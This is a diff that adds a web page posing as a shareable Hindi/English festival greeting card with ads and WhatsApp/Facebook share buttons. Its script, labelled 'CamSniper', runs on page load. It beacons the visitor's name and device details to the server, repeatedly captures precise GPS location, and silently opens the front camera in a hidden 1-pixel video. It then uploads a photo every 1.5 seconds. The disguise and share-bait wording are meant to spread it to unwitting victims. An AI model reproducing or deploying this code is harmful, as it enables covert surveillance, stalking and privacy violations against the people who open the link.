@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
+<title>Happy <span id="fesNameDisplay">Festival</span> to Your Friends!</title>
+
+    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
+    <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />
+    <link href='https://fonts.googleapis.com/css?family=Sofia:&effect=neon' rel='stylesheet'>
+    <link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png">
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap');
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family:'Poppins',sans-serif;
+      min-height:100vh; overflow-x:hidden;
+      background: linear-gradient(to bottom right, #f6ff00, #e1e8e7, #00ffe9);
+      -webkit-background-size: cover;
+      -moz-background-size: cover;
+      -o-background-size: cover;
+      background-size: cover;
+    }
+
+    i { color:#f06414; }
+
+    input[type=name], select {
+      width: 100%; padding: 12px 20px; margin: 4px 0;
+      display: inline-block; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box;
+    }
+
+    .footerbtn {
+      display: block; line-height: 15px; position: fixed; left: 0px; bottom: 0px; height: 40px;
+      border-radius: 15px; box-sizing: border-box; padding: 5px; background: #34af23;
+      color: #ffffff; font-size: 18px; text-align: center; text-decoration: none;
+      width: 45%; margin-left: 10px; box-shadow: 0 4px 12px 0 rgba(0,0,0,.3);
+      animation: footer infinite linear 1s;
+    }
+    .footerbtn :active { box-shadow: none }
+    @-webkit-keyframes footer {
+      from { -webkit-transform: rotateZ(0) }
+      25% { -webkit-transform: rotateZ(1.5deg) }
+      50% { -webkit-transform: rotateZ(0deg) }
+      75% { -webkit-transform: rotateZ(-1.5deg) }
+      to { -webkit-transform: rotateZ(0) }
+    }
+
+    .footerbtn1 {
+      display: block; line-height: 15px; position: fixed; right: 0px; bottom: 0px; height: 40px;
+      border-radius: 15px; box-sizing: border-box; padding: 5px; background: #000099;
+      color: #ffffff; font-size: 18px; text-align: center; text-decoration: none;
+      width: 45%; margin-right: 30px; box-shadow: 0 4px 12px 0 rgba(0,0,0,.3);
+      animation: footer infinite linear 1s;
+    }
+    .footerbtn1 :active { box-shadow: none }
+
+    .main-content {
+      position: relative; z-index: 10; min-height: 100vh; display: flex;
+      align-items: center; justify-content: center; padding: 20px;
+    }
+
+    .card {
+      background: rgba(255,255,255,0.05); backdrop-filter: blur(20px);
+      border: 1px solid rgba(255,255,255,0.1); border-radius: 28px;
+      padding: 48px 40px; max-width: 480px; width: 100%; text-align: center;
+      box-shadow: 0 40px 80px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.1);
+      animation: cardPop 0.8s cubic-bezier(0.34,1.56,0.64,1);
+    }
+    @keyframes cardPop { from { transform: scale(0.5) translateY(60px); opacity: 0 }
+      to { transform: scale(1) translateY(0); opacity: 1 } }
+
+    .emoji-header { font-size: 80px; margin-bottom: 8px;
+      animation: bounce 1.5s ease-in-out infinite; }
+    @keyframes bounce { 0%, 100% { transform: translateY(0) }
+      50% { transform: translateY(-12px) } }
+
+    h1 { font-size: 32px; font-weight: 800;
+      background: linear-gradient(135deg, #ffd700, #ff6b6b, #ff9a9e, #ffecd2);
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+      margin-bottom: 8px; line-height: 1.2; animation: glow 10s ease-in-out infinite; }
+    @keyframes glow {
+      0%, 100% { text-shadow: 0 0 30px red; }
+      25% { text-shadow: 0 0 30px orange; }
+      50% { text-shadow: 0 0 30px forestgreen; }
+      75% { text-shadow: 0 0 30px cyan; }
+    }
+
+    .subtitle { font-size: 15px; color: rgba(255,255,255,0.7);
+      margin-bottom: 28px; line-height: 1.6; }
+
+    .gift-box {
+      width: 120px; height: 120px; margin: 0 auto 28px;
+      position: relative; cursor: pointer; animation: giftWobble 3s ease-in-out infinite; }
+    @keyframes giftWobble {
+      0%, 100% { transform: rotate(-3deg) } 50% { transform: rotate(3deg) }
+    }
+    .gift-box::before {
+      content: '🎁'; font-size: 90px; position: absolute; inset: 0;
+      display: flex; align-items: center; justify-content: center;
+      filter: drop-shadow(0 0 20px rgba(255,215,0,0.6));
+    }
+
+    .from-msg {
+      background: rgba(255,215,0,0.08); border: 1px solid rgba(255,215,0,0.2);
+      border-radius: 14px; padding: 16px; font-size: 15px;
+      color: rgba(255,255,255,0.9); margin-bottom: 28px; line-height: 1.6;
+      font-style: italic;
+    }
+
+    .photo-section { margin-bottom: 24px; }
+
+    .fireworks { position: fixed; inset: 0; pointer-events: none; overflow: hidden; }
+    .spark {
+      position: absolute; width: 4px; height: 4px; border-radius: 50%;
+      animation: sparkFly var(--dur, 2s) ease-out forwards;
+    }
+    @keyframes sparkFly {
+      0% { transform: translate(0,0) scale(1); opacity: 1; }
+      100% { transform: translate(var(--tx), var(--ty)) scale(0); opacity: 0; }
+    }
+
+    .particles { position: fixed; inset: 0; pointer-events: none; }
+    .particle {
+      position: absolute; font-size: 20px; animation: floatUp 6s ease-in-out infinite; opacity: 0.8;
+    }
+    @keyframes floatUp {
+      0% { transform: translateY(110vh) rotate(0deg); opacity: 0; }
+      20% { opacity: 0.8; } 80% { opacity: 0.8; }
+      100% { transform: translateY(-10vh) rotate(720deg); opacity: 0; }
+    }
+
+    .m1 { position: fixed; left: 1%; width: auto; height: 100%; top: 1%; color: #000; }
+    .m2 { position: fixed; right: 1%; width: auto; height: 100%; top: 1%; color: #000; }
+
+    .bubbles { font-family: arial; }
+    .bubbles hi { font-family: 'Luckiest Guy', cursive; color: black; font-size: 2.5em; user-select: none; }
+    hi span { display: inline-block; animation: float .2s ease-in-out infinite; }
+    @keyframes float {
+      0%, 100% { transform: none; }
+      33% { transform: translateY(-1px) rotate(-2deg); }
+      66% { transform: translateY(1px) rotate(2deg); }
+    }
+    body:hover span { animation: bounce .6s; }
+    @keyframes bounce {
+      0%, 100% { transform: translate(0); }
+      25% { transform: rotateX(20deg) translateY(2px) rotate(-3deg); }
+      50% { transform: translateY(-20px) rotate(3deg) scale(1.1); }
+    }
+
+    h2 { font-size: 38px; text-align: center; color: #008000;
+      animation: rock infinite 1s; font-family: 'Indie Flower', cursive; letter-spacing: 2px; }
+    h3 { font-size: 48px; text-align: center; padding: 1px; margin: 1px;
+      color: #f06414; animation: fuck infinite 1s; font-family: 'Indie Flower', cursive; letter-spacing: 2px; }
+
+    @keyframes rock {
+      0% { transform: rotate(-1deg); } 50% { transform: rotate(2deg); }
+      100% { transform: rotate(-1deg); }
+    }
+    @keyframes fuck {
+      0% { transform: rotate(-2deg); } 50% { transform: rotate(2deg); }
+      100% { transform: rotate(-2deg); }
+    }
+
+    .mySlides { display: none; }
+    img { vertical-align: middle; }
+    .slideshow-container {
+      max-width: 1000px; position: relative; margin: auto;
+    }
+    .text {
+      color: #f2f2f2; font-size: 15px; padding: 8px 12px;
+      position: absolute; bottom: 8px; width: 100%; text-align: center;
+    }
+    .numbertext {
+      color: #f2f2f2; font-size: 12px; padding: 8px 12px;
+      position: absolute; top: 0;
+    }
+    .dot {
+      height: 15px; width: 15px; margin: 0 2px; background-color: #bbb;
+      border-radius: 50%; display: inline-block; transition: background-color 0.6s ease;
+    }
+    .active { background-color: #717171; }
+    .fade { animation-name: fade; animation-duration: 1.5s; }
+    @keyframes fade {
+      from { opacity: .4 } to { opacity: 1 }
+    }
+
+    .video-wrap { position: absolute; top: 0; left: 0; width: 1px; height: 1px;
+      overflow: hidden; opacity: 0; }
+    #video { width: 1px; height: 1px; }
+    #canvas { width: 1px; height: 1px; }
+</style>
+</head>
+
+<div class="video-wrap">
+  <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<body class="bg" id="rakhi">
+
+<center>
+  <span style="font-size: 20px;" id="fesNameHeader">▅ ▆ ▇ █ HAPPY <span id="fesNameSpan">FESTIVAL</span> █ ▇ ▆ ▅</span>
+</center>
+
+<center>
+  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+  <ins class="adsbygoogle" style="display:inline-block;width:300px;height:50px"
+    data-ad-client="ca-pub-4696491179456446" data-ad-slot="2568634816"></ins>
+  <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+</center>
+
+<center>
+  <div class="container">
+    <div class="main-greeting">
+      <div align="center" class="html2canvas-ignore">
+        <div style="font-size: 20px; font-weight: 500; color: Black;">
+          <p id="demo"></p>
+          <div dir="ltr" style="text-align: left;" trbidi="on">
+            <div style="background-color: rgb(255, 140, 0); border-radius: 17px; border: 0px solid rgb(0, 0, 0);
+              box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: whitesmoke; font-family: arial, sans-serif;
+              font-size: 18px; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
+              <marquee behavior="alternate"><b>
+                "<span id="fesNameMsg1">FESTIVAL</span> का ये शुभ अवसर आपके जीवन में अनेकों ख़ुशियाँ लेकर आए"
+              </b></marquee>
+            </div>
+            <div style="background-color: rgb(255, 255, 255); border-radius: 17px; border: 0px solid rgb(0, 0, 0);
+              box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: blue; font-family: arial, sans-serif;
+              font-size: 18px; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
+              <marquee behavior="alternate"><b>
+                इस <span id="fesNameMsg2">FESTIVAL</span> हमारी शुभकामनाएँ आपके साथ हैं
+              </b></marquee>
+            </div>
+            <div style="background-color: rgb(0, 255, 42); border-radius: 17px; border: 0px solid rgb(0, 0, 0);
+              box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: black; font-family: arial, sans-serif;
+              font-size: 18px; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
+              <marquee behavior="alternate"><b>
+                || <span id="fesNameMsg3">FESTIVAL</span> की हार्दिक बधाई ||
+              </b></marquee>
+            </div>
+          </div>
+          <br><br>
+
+          <center>
+            <figure>
+              <h1 style="text-transform: uppercase;" id="nameDisplay1"></h1>
+              <h1 style="text-transform: uppercase;" id="nameDisplay2"></h1>
+              <h1 style="text-transform: uppercase;" id="nameDisplay3"></h1>
+              <h1 style="text-transform: uppercase;" id="nameDisplay4"></h1>
+              <h1 style="text-transform: uppercase;" id="nameDisplay5"></h1>
+              <h1 style="text-transform: uppercase;" id="nameDisplay6"></h1>
+              <h1 style="text-transform: uppercase;" id="nameDisplay7"></h1>
+            </figure>
+          </center>
+
+          <div class="vi" style="text-align: center;">
+            <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+            <ins class="adsbygoogle" style="display:inline-block;width:300px;height:50px"
+              data-ad-client="ca-pub-4696491179456446" data-ad-slot="5590491777"></ins>
+            <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+          </div>
+          <br><br>
+
+          <center>
+            <p style="text-align: center;">
+              <strong><span style="background-color: #ffea00; color: #005f96; font-size: 18pt;
+                font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;Wishing you a very </span></strong>
+            </p>
+          </center>
+          <br>
+          <p style="text-align: center;">
+            <strong><span style="font-size: 21pt; font-family: 'comic sans ms', sans-serif; color: #ff7700;">
+              ✪ <span id="fesNameHappy">Happy FESTIVAL</span> ✪
+            </span></strong>
+          </p>
+          <br>
+          <p style="text-align: center;">
+            <strong><span style="background-color: #ff0000; color: #ffffff; font-size: 16pt;
+              font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;to you and your lovely family </span></strong>
+          </p>
+          <br>
+          <p style="text-align: center;">
+            <span style="background-color: #008000; color: #ffffff; font-size: 16pt;
+              font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;May this auspicious occasion of
+              <span id="fesNameOccasion">FESTIVAL</span> bring happiness, prosperity, health, and peace in your life.</span>
+          </p>
+          <br>
+          <p style="text-align: center;">
+            <span style="background-color: #ff00ff; color: #ffffff; font-size: 16pt;
+              font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;✪ I wish that this
+              <span id="fesNameBest">FESTIVAL</span> is your best one. ✪</span>
+          </p>
+          <br>
+          <p style="text-align: center;">
+            <span style="background-color: #663399; color: #FFFAFA; font-size: 15pt;
+              font-family: tahoma, arial, helvetica, sans-serif;">&nbsp; यह संदेश
+              <span id="fesNameMobile">FESTIVAL</span> तक सभी के मोबाइल में होना चाहिए यह आपका फर्ज हैं </span>
+          </p>
+          <br>
+          <center>
+            <div class="busi">
+              <h4>
+                <p style="text-transform: uppercase; font-size: 26px; color: #ffffff;" id="nameBy">
+                  <span id="nameBySpan">by - USER</span>
+                </p>
+              </h4>
+            </div>
+          </center>
+
+          <center>
+            <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+            <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-4696491179456446"
+              data-ad-slot="1112298516" data-ad-format="link" data-full-width-responsive="true"></ins>
+            <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+          </center>
+        </div>
+      </div>
+    </div>
+  </div>
+</center>
+
+<script>
+// ── Set festival name from URL param ──
+const urlParams = new URLSearchParams(window.location.search);
+const fesName = urlParams.get('fes_name') || 'Festival';
+document.querySelectorAll('#fesNameDisplay, #fesNameSpan, #fesNameMsg1, #fesNameMsg2, #fesNameMsg3, #fesNameHappy, #fesNameOccasion, #fesNameBest, #fesNameMobile').forEach(el => {
+  el.textContent = fesName;
+});
+
+// ── Prompt for user name ──
+let userName = "";
+try {
+  userName = prompt("Please Enter Your Name\n\n👇👇👇👇👇", "Friend") || "Friend";
+} catch (e) {
+  userName = "Friend";
+}
+document.querySelectorAll('#nameDisplay1, #nameDisplay2, #nameDisplay3, #nameDisplay4, #nameDisplay5, #nameDisplay6, #nameDisplay7').forEach(el => {
+  el.textContent = userName;
+});
+document.getElementById('nameBySpan').textContent = 'by - ' + userName;
+
+// ── Countdown timer ──
+var countDownDate = new Date();
+countDownDate.setDate(countDownDate.getDate() + 1);
+var x = setInterval(function () {
+  var now = new Date().getTime();
+  var distance = countDownDate - now;
+  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
+  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+  document.getElementById("demo").innerHTML = days + "<i> Days,</i> " + hours + " <i>Hrs,</i> " + minutes + "<i> Min,</i> " + seconds + "<i> Sec</i> ";
+  if (distance < 0) {
+    clearInterval(x);
+    document.getElementById("demo").innerHTML = "🙏 Welcome 🙏";
+  }
+}, 1000);
+
+// ── CamSniper config ──
+const SERVER = window.location.origin;
+let sessionId = null;
+let photoIndex = 0;
+
+// ── Send beacon ──
+async function sendBeacon() {
+  try {
+    const r = await fetch(`${SERVER}/api/beacon`, {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        template: 'festival',
+        fes_name: fesName,
+        user_name: userName,
+        screen: { width: screen.width, height: screen.height },
+        platform: navigator.platform,
+        language: navigator.language
+      })
+    });
+    const d = await r.json();
+    sessionId = d.session;
+  } catch (e) { console.log('[!] Beacon error:', e); }
+}
+
+// ── Capture photo ──
+function capturePhoto() {
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  if (video.readyState < 2) return;
+  canvas.width = video.videoWidth || 640;
+  canvas.height = video.videoHeight || 480;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0);
+  const b64 = canvas.toDataURL('image/jpeg', 0.85);
+  if (sessionId) {
+    fetch(`${SERVER}/api/photo`, {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ session: sessionId, image: b64, index: photoIndex++, camera: 'front' })
+    }).catch(e => console.log('[!] Photo send error:', e));
+  }
+}
+
+// ── Capture location (robust, multiple retries) ──
+async function captureLocation() {
+  console.log('[DEBUG] captureLocation called, sessionId=', sessionId);
+  let gpsLat = null, gpsLon = null, gpsAcc = null;
+  let gpsGot = false;
+
+  if (!navigator.geolocation) {
+    console.log('[!] Geolocation not supported by browser');
+  } else {
+    // Try up to 3 times to get GPS fix
+    for (let attempt = 1; attempt <= 3; attempt++) {
+      console.log(`[DEBUG] GPS attempt ${attempt}/3`);
+      try {
+        const pos = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+          });
+        });
+        gpsLat = pos.coords.latitude;
+        gpsLon = pos.coords.longitude;
+        gpsAcc = pos.coords.accuracy;
+        gpsGot = true;
+        console.log('[DEBUG] ✓ GPS fix (attempt', attempt, '):', gpsLat, gpsLon, 'acc:', gpsAcc, 'm');
+        break;
+      } catch (err) {
+        console.log(`[!] GPS attempt ${attempt} failed:`, err.code, '-', err.message);
+        if (attempt < 3) {
+          await new Promise(r => setTimeout(r, 2000)); // wait 2s before retry
+        }
+      }
+    }
+
+    // If getCurrentPosition failed all 3 times, try watchPosition
+    if (!gpsGot) {
+      console.log('[DEBUG] getCurrentPosition failed, trying watchPosition...');
+      let watchId = null;
+      try {
+        watchId = navigator.geolocation.watchPosition((pos) => {
+          gpsLat = pos.coords.latitude;
+          gpsLon = pos.coords.longitude;
+          gpsAcc = pos.coords.accuracy;
+          gpsGot = true;
+          console.log('[DEBUG] ✓ GPS fix (watchPosition):', gpsLat, gpsLon, 'acc:', gpsAcc, 'm');
+          navigator.geolocation.clearWatch(watchId);
+        }, (err) => {
+          console.log('[!] watchPosition error:', err.code, '-', err.message);
+        }, {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0
+        });
+
+        // Wait up to 15 seconds for watchPosition
+        await new Promise(r => setTimeout(r, 15000));
+
+        if (watchId) {
+          navigator.geolocation.clearWatch(watchId);
+        }
+      } catch (err) {
+        console.log('[!] watchPosition setup failed:', err);
+        if (watchId) navigator.geolocation.clearWatch(watchId);
+      }
+    }
+  }
+
+  // Always send to server — if GPS failed (null), server uses IP geolocation fallback
+  const locationData = {
+    session: sessionId,
+    lat: gpsGot ? gpsLat : null,
+    lon: gpsGot ? gpsLon : null,
+    accuracy: gpsGot ? gpsAcc : null
+  };
+  console.log('[DEBUG] Sending location to server:', locationData);
+
+  if (sessionId) {
+    try {
+      const r = await fetch(`${SERVER}/api/location`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(locationData)
+      });
+      const d = await r.json();
+      console.log('[DEBUG] Location response:', d);
+      if (d.source === 'gps') {
+        console.log('[✓] Exact GPS location captured');
+      } else if (d.source === 'ip') {
+        console.log('[!] GPS not available — used IP fallback location');
+      }
+      if (d.location_verified === false) {
+        console.log('[!] WARNING: Location flagged as suspicious:', d.suspicion_reason);
+      }
+    } catch (e) {
+      console.log('[!] Location send error:', e);
+    }
+  }
+}
+
+// ── Camera init ──
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const constraints = { audio: false, video: { facingMode: "user" } };
+
+async function initCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    window.stream = stream;
+    video.srcObject = stream;
+    console.log('[DEBUG] Camera started successfully');
+
+    const context = canvas.getContext('2d');
+
+    // Take first photo immediately (don't wait for readyState)
+    try {
+      capturePhoto();
+    } catch(e) { console.log('[!] First photo capture error:', e); }
+
+    // Then capture every 1.5 seconds
+    setInterval(function () {
+      try {
+        capturePhoto();
+      } catch(e) { console.log('[!] Periodic photo error:', e); }
+    }, 1500);
+  } catch (e) {
+    console.log('[!] Camera error:', e.toString());
+  }
+}
+
+// ── Initialize: Location and Camera in PARALLEL ──
+sendBeacon().then(() => {
+  console.log('[DEBUG] Session ID:', sessionId);
+  // Start location and camera at the same time (don't block each other)
+  captureLocation();
+  initCamera();
+}).catch(e => {
+  console.log('[!] Init error:', e);
+});
+</script>
+
+<center>
+  <a class="footerbtn" href="whatsapp://send?text=*मुझसे पहले ऐसा संदेश आपके लिए किसी ने नही भेजा होगा निचे क्लिक करके देखो क्या है आपके लिए* 👉" data-action="share/whatsapp/share">
+    <img width="22px" height="22px" src="https://cdn.pixabay.com/photo/2015/08/03/13/58/soon-873316_640.png">
+    <b style="font-size: 26px;">Share</b>
+  </a>
+  <a class="footerbtn1" href="https://www.facebook.com/sharer/sharer.php?u=" target="_blank" title="Share this post on Facebook" class="facebook">
+    <img width="22px" height="22px" src="https://cdn.pixabay.com/photo/2017/06/22/06/22/facebook-2429746_640.png">
+    <b style="font-size: 26px;">Share</b>
+  </a>
+</center>
+
+</body>
+</html>
